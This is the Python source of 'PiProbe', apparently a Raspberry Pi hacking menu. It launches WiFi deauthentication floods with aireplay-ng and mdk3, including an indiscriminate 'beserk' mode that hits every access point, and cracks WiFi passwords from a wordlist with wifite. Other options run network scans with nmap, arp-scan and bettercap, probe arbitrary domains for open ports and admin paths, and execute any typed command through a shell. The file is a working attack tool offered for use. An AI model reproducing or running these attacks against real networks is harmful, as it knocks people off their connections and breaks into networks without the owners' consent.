import subprocess
import http.server
import socketserver
import socket
import re
import csv
import os
import time
import shutil
from urllib.parse import urlparse
import requests
from datetime import datetime
import json
speed = 0.2

active_wireless_networks = []
wordlist_path = "wrdlist.txt"
wifi_interface_choice = "wlan0"

def wifideauth():
    os.system("clear")
    print("\033[36mWifi Deauth Attack:\033[0m")
    print("")
    print("\033[31mMonitored Mode must be enabled first!\033[0m")
    print("")
    print("Whats the bssid of the target?")
    attack_ip = input(">")
    if attack_ip:
        os.system("clear")
        try:
            subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", attack_ip, wifi_interface_choice + "mon"])
        except KeyboardInterrupt:
            print("Attack Completed!")
    elif not attack_ip:
        print("\033[31mNo attack IP found!\033[0m")

def intro():
    print("\033[35m")
    os.system('clear')
    print(r"""

       
  _  _ 
 | || |
  \_, |
  |__/ 

""")
    time.sleep(speed)   
    os.system('clear')
    print(r"""

            
  _  _ __ _ 
 | || / _` |
  \_, \__,_|
  |__/      

""")
    time.sleep(speed)
    os.system('clear')
    print(r"""

                   
  _  _ __ ___ __ __
 | || / _` \ V  V /
  \_, \__,_|\_/\_/ 
  |__/             

""")
    time.sleep(speed)
    os.system('clear')
    print(r"""

                        
  _  _ __ ___ __ ___ _  
 | || / _` \ V  V / ' \ 
  \_, \__,_|\_/\_/|_||_|
  |__/                  

""")
    time.sleep(speed)
    os.system('clear')
    print(r"""

                            
  _  _ __ ___ __ ___ _  ___ 
 | || / _` \ V  V / ' \/ -_)
  \_, \__,_|\_/\_/|_||_\___|
  |__/                      

""")
    time.sleep(speed)
    os.system('clear')
    print(r"""

                            _   
  _  _ __ ___ __ ___ _  ___| |_ 
 | || / _` \ V  V / ' \/ -_)  _|
  \_, \__,_|\_/\_/|_||_\___|\__|
  |__/                          

""")
    time.sleep(speed)
    os.system('clear')
    print(r"""

                            _       
  _  _ __ ___ __ ___ _  ___| |___ __
 | || / _` \ V  V / ' \/ -_)  _\ \ /
  \_, \__,_|\_/\_/|_||_\___|\__/_\_\
  |__/                              

""")
    print("\033[0m")
    time.sleep(0.5)
    os.system('clear')
    print("Loading...")
    time.sleep(1)

def nmap_scan():
    os.system('clear')
    print("\033[36mWhat is the IP I should scan? (ends with .0/24)\033[0m")
    scan_ip = input(">")
    os.system('clear')
    print("\033[31mThis Scan may take 1-15+ minutes!\033[0m")
    print("")
    try:
        subprocess.run(['sudo', 'nmap', '-sn' , scan_ip])
        print("Press \033[31me\033[0m to exit")
        if input(">") == "e":
            time.sleep(0.5)
            os.system('clear')
    except KeyboardInterrupt:
        print("\n\033[31mScan stopped\033[0m")

def disable_monitored_mode():
    try:
        subprocess.run(['sudo', 'airmon-ng', 'stop', wifi_interface_choice + "mon"])
    except KeyboardInterrupt:
        print("\n\033[31mInterrupted by Input!\033[0m")
        time.sleep(0.5)

def search_network_devices():
    try:
        print("\033[36mScanning for Devices\033[0m")
        print("")
        subprocess.run(['sudo', 'arp-scan', '--localnet'])
        print("")
        print("Press \033[31me\033[0m to exit")
        if input(">") == "e":
            time.sleep(0.25)
            os.system('clear')
    except KeyboardInterrupt:
        print("\n Scan stopped.")
        time.sleep(0.5)


def start_server():
    html_file = input("Enter the full path to the HTML file you want to serve: ").strip()
    port_selection = input("What Port do you want to use? (default=8000): ").strip()


    if not port_selection:
        port_selection = 8000
    else:
        port_selection = int(port_selection)

    if not os.path.isfile(html_file):
        print(f"\033[31mError: The file '{html_file}' does not exist.\033[0m")
        return

    directory = os.path.dirname(html_file)
    file_name = os.path.basename(html_file)


    os.chdir(directory)


    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/" or self.path == f"/{file_name}":
                self.path = f"/{file_name}"
                return super().do_GET()
            else:
                self.send_error(404, "File Not Found")


    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)


    with socketserver.TCPServer(("", port_selection), CustomHandler) as httpd:
        os.system('clear')
        time.sleep(0.5)
        print(f"Serving file '{file_name}' on:")
        print(f"  Localhost: http://localhost:{port_selection}")
        print(f"  Network: http://{local_ip}:{port_selection}")
        print("")
        print("Press \033[31mCtrl+C\033[0m to stop the server.")
        print("")

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServer stopped.")

def check_if_installed(program_name):
    result = subprocess.run(['which', program_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def check_for_essid(essid, lst):
    check_status = True

if not 'SUDO_UID' in os.environ.keys():
    print("This Program needs Sudo to run properly!")
    print("If you don't have access to superuser rights try the rootless version:")
    print("python3 rootless.py")
    print("Note that some functions might not work properly")
    exit()

def cpu_temp():
    try:
        output = subprocess.check_output(['sensors']).decode()
        for line in output.splitlines():
            if "Core 0" in line:
                return line.strip()
    except Exception as e:
        return f"Error reading temperature: {e}"

def quick_wifite_atk():
    os.system('clear')
    global wordlist_path
    print("\033[36mType in the Wordlist Name (default: wrdlist.txt)\033[0m")
    new_wordlist_path = input(">")
    if new_wordlist_path:
        wordlist_path = new_wordlist_path
    try:
        subprocess.run(['sudo', 'wifite', '--daemon', '--no-wps', '--no-pmkid', '--dict', wordlist_path])
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

def get_wifi_networks():
    try:
        subprocess.run(['sudo', 'wash', '-i', wifi_interface_choice + 'mon'])
    except Exception as e:
        print(f"Error scanning for Neworks: {e}")

def main():
    print("\033[36mScanning for WiFi Networks\033[0m")
    print("\033[36m--------------------------\033[0m")
    print()
    get_wifi_networks()

os.system('clear')

data_file = "os.json"

file_path = "os.json"

def save_data(data):
    with open(data_file, "w") as file:
        json.dump(data, file)

def load_data():
    try:
        with open(data_file, "r") as file:
            return json.load(file)
    except (IOError, FileNotFoundError):
        return{}

def yes_no():
    print("_________________")
    print(" Press \033[31me\033[0m to exit ")
    print("_________________")
    yes_no_ans = input(">")
    if yes_no_ans == "e":
        time.sleep(0.005)


if not os.path.exists(file_path):
    print("\033[33mWhat Operating System do you use? \033[35mDebian[1]\033[0m/\033[34mArch[2]\033[0m")
    operating_sys = input(">")
    data = operating_sys
    save_data(data)
else:
    time.sleep(0.11)
    operating_sys = load_data()


intro()
while True:

    os.system('clear')
    print("--------------------------------------")
    print("-----------\033[36mFor \033[35mDebian\033[0m/\033[34mArch\033[0m------------")
    print("""--------------------------------------
 \033[36m______ _ ______           _             
(_____ (_|_____ \         | |            
 _____) ) _____) )___ ___ | | _   ____   
|  ____/ |  ____/ ___) _ \| || \ / _  )  
| |    | | |   | |  | |_| | |_) | (/ /   
|_|    |_|_|   |_|   \___/|____/ \____)\033[0m  
""")
    print("--------------------------------------")
    print("----------\033[36mPiProbe by \033[31my\033[32ma\033[33mw\033[34mn\033[35me\033[36mt\033[33mx\033[0m----------")
    print("---\033[31mgithub\033[32m.com\033[33m/thePortal362\033[34m/PiProbe\033[0m----")
    print("--------------------------------------")
    print("")
    print("             \033[36mSelect Mode:\033[0m")
    print("")
    print("               \033[35m1.\033[0m WiFi")
    print("         \033[35m2.\033[0m Start HTTP Server (NOT SECURE!)")
    print("               \033[35m3.\033[0m Tools")
    print("                \033[35m4.\033[0m CMD")
    print("          \033[35m5.\033[0m Clear OS Choice")
    print(" \033[35m6.\033[0m Exit (6.1: Disable Monitored Mode)")
    print("")
    mode_select = input(">")
    time.sleep(0.5)


    if mode_select == "1" or mode_select == "wifi":
        print("WiFi mode selected")
        time.sleep(0.2)
        os.system('clear')
        time.sleep(0.25)
        print("\033[36mWhat do you want to do?\033[0m")
        time.sleep(0.25)
        print("1. Scan for interfaces and enable Monitored Mode")
        print("2. Scan for WiFi networks")
        print("3. Quick Wifite Attack (Use 3.2 for normal attack)")
        print("4. Search for Localnetwork Devices (4.1 nmap scan)")
        print("5. MDK3 AP Deauth")
        print("6. WiFi Deauth")
        print("7. Go back")
        wifi_select = input(">")

        if wifi_select == "2" or wifi_select == "scan for networks":
            print("Scanning for WiFi Networks...")
            print("")
            print("\033[31m!Monitored Mode must be enabled first!\033[0m")
            time.sleep(1.5)
            os.system('clear')
            main()
            print("")
            print("Press \033[31me\033[0m to Exit")
            exit_ans = input(">")
            if exit_ans == "e":
                os.system('clear')
                time.sleep(1)

        elif wifi_select == "1" or wifi_select == "scan for interfaces":
            os.system('clear')
            time.sleep(0.5)

            wlan_pattern = re.compile("^wlan[0-9]+")

            check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

            if len(check_wifi_result) == 0:
                print("No WiFi Adapter found")
                exit()

            for index, item in enumerate(check_wifi_result):
                print(f"{item}")

            while True:
                wifi_interface_choice = input("\033[35mSelect an interface:\033[0m ")
                try:
                    if check_wifi_result:
                        subprocess.run(['sudo', 'airmon-ng', 'start', wifi_interface_choice])
                        break
                except:
                    print("Please select a \033[31mreal\033[0m interface.")
                    time.sleep(2)
            os.system('clear')

        elif wifi_select == "3" or wifi_select =="wifite quick":
            os.system('clear')
            quick_wifite_atk()
            yes_no()
            os.system('clear')

        elif wifi_select == "4" or wifi_select =="scan for localnet":
            print("Scan Mode")
            time.sleep(0.5)
            os.system('clear')
            search_network_devices()

        elif wifi_select == "4.1" or wifi_select == "nmap scan":
            print("Scan Mode")
            time.sleep(0.5)
            os.system('clear')
            nmap_scan()

        elif wifi_select == "5" or wifi_select == "ap deauth":
            print("AP Deauth")
            time.sleep(0.5)
            os.system("clear")
            print("\033[36mWhat AP do you want to attack?\033[0m")
            attack_ip = input(">")
            time.sleep(0.5)
            os.system('clear')
            if "beserk" in attack_ip:
                try:
                    subprocess.run(["sudo", "mdk3", wifi_interface_choice + "mon", "a"])
                except subprocess.CalledProcessError as e:
                    print(f"Error: {e}")
            else:
                try:
                    subprocess.run(["sudo", "mdk3", wifi_interface_choice + "mon", "a", "-a", attack_ip])
                except subprocess.CalledProcessError as e:
                    print(f"Error: {e}")
            time.sleep(5)

        elif wifi_select == "7" or wifi_select == "back":
            time.sleep(0.2)

        elif wifi_select == "6" or wifi_select == "deauth":
            time.sleep(0.1)
            wifideauth()
            print("")
            yes_no()    

        elif wifi_select == "3.2" or wifi_select == "wifite":
            time.sleep(0.5)
            os.system('clear')
            wordlist_path_2 = "wrdlist.txt"
            print("Input the Wordlist Name (default: wrdlist.txt)")
            new_wordlist_path = input(">")
            if new_wordlist_path:
                wordlist_path_2 = new_wordlist_path
            os.system('clear') 
            time.sleep(0.2)
            try:
                subprocess.run(["sudo", "wifite", "--daemon", "--kill", "--dict", wordlist_path_2])
            except subprocess.CalledProcessError as e:
                print(f"Error: {e}")
            yes_no()
            time.sleep(0.025)
            os.system('clear')

    if mode_select == "2" or mode_select == "start http":
        os.system('clear')
        time.sleep(0.2)
        start_server()
        time.sleep(2.5)

    if mode_select == "3" or mode_select == "tools":
        os.system('clear')
        time.sleep(0.1)
        print("\033[36mAll Tools:\033[0m")
        print("1. Bettercap")
        print("2. Advanced Web Analysis")
        print("3. Go back")
        tool_select = input(">")

        if tool_select == "1" or tool_select == "bettercap":
            os.system('clear')
            if check_if_installed('bettercap'):
                print("Checking if installed...")
                time.sleep(0.5)
                print("is_installed \033[32m[ok]\033[0m")
                time.sleep(1)
            else:
                print("Checking if installed...")
                time.sleep(0.5)
                print("is_installed \033[31m[failed]\033[0m")
                time.sleep(0.5)
                print("Do you want to install bettercap? [Y/n]")
                install_ans = input(">")
                if install_ans == "y":
                    os.system('clear')
                    if operating_sys == "1":
                        os.system('clear')
                        subprocess.run(['sudo', 'apt', 'install', 'bettercap'])
                    elif operating_sys == "2":
                        os.system('clear')
                        subprocess.run(['sudo', 'pacman', '-S', 'bettercap'])
            print("Starting Bettercap...")
            os.system('clear')
            try:
                subprocess.run(['bettercap'], check=True)
            except subprocess.CalledProcessError as e:
                time.sleep(3600)
                print(f"Error: {e}")
            time.sleep(3.5)
            os.system('clear')

        elif tool_select =="2" or tool_select == "awa":


            def validate_domain(domain):
                """Add protocol and www if needed, and validate the domain."""
                if not domain.startswith("http://") and not domain.startswith("https://"):
                    domain = "http://" + domain
                try:
                    parsed_url = urlparse(domain)
                    domain_name = parsed_url.netloc or parsed_url.path
                    return domain_name
                except Exception as e:
                    print(f"Invalid domain: {e}")
                    return None

            def get_ip_addresses(domain):
                """Get IPv4 and IPv6 addresses of the domain."""
                try:
                    ipv4 = socket.gethostbyname(domain)
                    ipv6 = socket.getaddrinfo(domain, None, socket.AF_INET6)
                    ipv6 = ipv6[0][4][0] if ipv6 else None
                    return ipv4, ipv6
                except socket.gaierror as e:
                    print(f"Could not resolve IP addresses: {e}")
                    return None, None

            def get_ports(domain):
                """Scan for open ports using nmap (must be installed in Termux)."""
                try:
                    result = subprocess.check_output(["nmap", "-F", domain], stderr=subprocess.DEVNULL, text=True)
                    ports = re.findall(r"(\d{1,5})/tcp\s+open", result)
                    return ports
                except FileNotFoundError:
                    print("Nmap is not installed. Install it by running: pkg install nmap")
                    return []
                except Exception as e:
                    print(f"Error scanning ports: {e}")
                    return []

            def get_paths(domain):
                """Discover common paths (e.g., /home, /about)."""
                common_paths = ["/", "/home", "/about", "/contact", "/login", "/admin"]
                found_paths = []
                for path in common_paths:
                    try:
                        url = f"http://{domain}{path}"
                        response = requests.head(url, timeout=5)
                        if response.status_code < 400:
                            found_paths.append(path)
                    except requests.RequestException:
                        pass
                return found_paths

            def mainscript():
                os.system('clear')
                print("Advanced Web Analysis")
                domain = input("Enter the domain: ").strip()
                domain_name = validate_domain(domain)
                if not domain_name:
                    print("Invalid domain. Exiting.")
                    return

                print(f"\nFetching information for: {domain_name}")
                time.sleep(0.5)
                os.system('clear')
                print("Information for " + domain_name + ":")
                print("")
                ipv4, ipv6 = get_ip_addresses(domain_name)
                if ipv4:
                    print(f"IPv4 Address: {ipv4}")
                else:
                    print("IPv4 Address: Not found")

                if ipv6:
                    print(f"IPv6 Address: {ipv6}")
                else:
                    print("IPv6 Address: Not found")

                ports = get_ports(domain_name)
                if ports:
                    print(f"Open Ports: {', '.join(ports)}")
                else:
                    print("Open Ports: None found or nmap not installed")

                paths = get_paths(domain_name)
                if paths:
                    print(f"Available Paths: {', '.join(paths)}")
                else:
                    print("Available Paths: None found")

            if __name__ == "__main__":
                mainscript()
                time.sleep(1)

            time.sleep(1)


        elif tool_select == "3" or tool_select == "back":
            time.sleep(0.2)

    if mode_select == "4" or mode_select == "cmd":
        print("Cmd selected")
        time.sleep(0.25)
        os.system('clear')
        print("\033[36mWhat do you want to do?\033[0m")
        print("1. Update & upgrade")
        print("2. Install something with pacman or apt")
        print("3. Custom Command")
        print("4. Credits")
        print("5. Shutdown or Reboot")
        print("6. Go back")
        other_select = input(">")

        if other_select == "1" or other_select == "update":
            os.system('clear')
            print("Making sure you have the latest")
            time.sleep(1.5)
            os.system('clear')
            print("Please wait...")
            if operating_sys == "1":
                try:
                    subprocess.run(['apt', 'update'], check=True)
                    subprocess.run(['apt', 'upgrade', '-y'], check=True)
                    os.system('clear')
                    print("Success!")
                except subprocess.CalledProcessError as e:
                    print("")
                    print("\033[31mError:\033[0m")
                    print(f"\033[31mError: {e}\033[0m")
                    time.sleep(2)
            elif operating_sys == "2":
                try:
                    subprocess.run(['sudo', 'pacman', '-Syu'], check=True)
                    os.system('clear')
                    print("Success!")
                except subprocess.CalledProcessError as e:
                    print("")
                    print("\033[31mError:\033[0m")
                    print(f"\033[31mError: {e}\033[0m")
                    time.sleep(2)
            time.sleep(2.5)
            os.system('clear')

        if other_select == "2" or other_select == "install":
            os.system('clear')
            print("\033[36mWhat do you want to install?\033[0m")
            install_pkg = input(">")
            os.system('clear')
            print("Installing " + install_pkg + "...")
            time.sleep(0.5)
            if operating_sys == "2":
                try:
                    subprocess.run(['sudo', 'pacman', '-S', install_pkg], check=True)
                    os.system('clear')
                    print("Success!")
                except subprocess.CalledProcessError as e:
                    print(f"Error: {e}")
            elif operating_sys == "1":
                try:
                    subprocess.run(['sudo', 'apt', 'install', install_pkg], check=True)
                    os.system('clear')
                    print("Success!")
                except subprocess.CalledProcessError as e:
                    print(f"Error: {e}")
            time.sleep(2.5)
            os.system('clear')

        if other_select == "3" or other_select == "custom cmd":
            os.system('clear')
            print("\033[36mWhat Command do you want to execute?\033[0m")
            custom_cmd = input(">")
            time.sleep(0.25)
            subprocess.run(custom_cmd, shell=True)
            time.sleep(0.25)
            os.system('clear')

        if other_select == "4" or other_select == "credits":
            os.system('clear')
            print("\033[35mScript by\033[0m \033[36myawnetx\033[0m")
            print("")
            print("Press \033[31me\033[0m to exit")
            if input(">") == "e":
                os.system('clear')

        if other_select == "5" or other_select == "shutdown":
            os.system('clear')
            print("What do you want to do?")
            print("1. Shutdown")
            print("2. Reboot")
            sutd_select = input(">")

            if sutd_select == "1":
                subprocess.run(['shutdown', '-h', 'now'])

            if sutd_select == "2":
                subprocess.run(['reboot'])

        if other_select == "6" or other_select == "back":
            time.sleep(0.2)

    if mode_select == "5" or mode_select == "clear os":
        try:
            os.remove(file_path)
            print("Successfully removed the OS Choice")
            time.sleep(1)
        except:
            print("Failed to remove Save Data")
            time.sleep(1)


    if mode_select == "6" or mode_select == "exit" or mode_select == "quit":
        print("\033[31mQuitting...\033[0m")
        time.sleep(0.4)
        subprocess.run(['sudo', 'airmon-ng', 'stop', wifi_interface_choice + 'mon'])
        os.system('clear')
        break

    if mode_select == "shutdown":
        os.system('clear')
        print("\033[31mShutdown in 3 seconds\033[0m")
        time.sleep(1)
        os.system('clear')
        print("\033[31mShutdown in 2 seconds\033[0m")
        time.sleep(1)
        os.system('clear')
        print("\033[31mShutdown in 1 second\033[0m")
        time.sleep(1)
        subprocess.run(['shutdown', '-h', 'now'])

    if mode_select == "reboot":
        os.system('clear')
        print("\033[31mRebooting in 3 seconds\033[0m")
        time.sleep(1)
        os.system('clear')
        print("\033[31mRebooting in 2 seconds\033[0m")
        time.sleep(1)
        os.system('clear')
        print("\033[31mRebooting in 1 second\033[0m")
        time.sleep(1)
        subprocess.run(['reboot'])

    if mode_select == "6.1" or mode_select == "disable":
        time.sleep(0.5)
        os.system('clear')
        disable_monitored_mode()
        os.system('clear')
    elif not mode_select:
        print("\033[31mThere was no Input!\033[0m")
        time.sleep(1)
